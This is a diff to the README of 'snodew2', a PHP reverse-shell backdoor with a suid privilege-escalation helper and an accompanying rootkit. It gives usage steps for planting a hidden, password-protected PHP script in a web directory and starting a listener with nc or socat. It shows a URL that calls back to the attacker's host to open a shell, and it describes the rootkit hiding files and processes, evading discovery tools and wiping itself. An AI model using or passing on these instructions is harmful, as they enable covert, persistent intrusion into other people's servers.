@@ -1,4 +1,5 @@
 
+
 # snodew2
  * PHP reverse shell backdoor which uses a small suid binary to escalate privileges on connection.
  * new iteration of [snodew](https://github.com/mempodippy/snodew) but better.
@@ -39,21 +40,20 @@ NO_ROOTKIT=1 ./setup.sh /var/www/html/blog sexlovegod
  * visit that in your browser. making sure you set your correct password.
    * for example, `http://lol.ok/blog/gjunmf.php?password=sexlovegod`
  * listen for an incoming connection coming from the box you installed snodew on, with an appropriate utility for your setup.
-   * `socat file:`tty`,raw,echo=0 tcp-listen:<SECRET_PORT>`
-   * `src/listen_socatssl.sh <SECRET_PORT>`
+   * `src/listen_socat.sh <-ssl/-plain> <SECRET_PORT>`
    * `nc -vlp <SECRET_PORT>`
    * `http://lol.ok/blog/gjunmf.php?password=sexlovegod&host=urbox`
    * congrats u have a shell
 
 ### examples of successful installation & usage (snodew.socat.ssl.php)
 <b>result of successful installation:</b><br>
-<img src="https://i.imgur.com/V8tABI9.png">
+<img src="https://i.imgur.com/DGWnYeY.png">
 
 <b>visiting newly created & hidden php script:</b><br>
-<img src="https://i.imgur.com/cY8trpr.png">
+<img src="https://i.imgur.com/52ZfXgG.png">
 
 <b>getting the reverse shell from the kitted box:</b><br>
-<img src="https://i.imgur.com/GLsDxnj.png">
+<img src="https://i.imgur.com/BBnvnyl.png">
 
 ## general notes
  * setup & installation of snodew is free of any significant dependencies.
@@ -98,3 +98,4 @@ NO_ROOTKIT=1 ./setup.sh /var/www/html/blog sexlovegod
  * hide: obviously, files & processes spawned for or by the rootkit & snodew's backdoor.
  * evades discovery from various tools.
  * running `./killself` in a backdoor shell will remove the backdoor & rootkit from the box.
+ * if one file doesn't exist (deleted??) the rootkit will delete all of the other files created during installation.
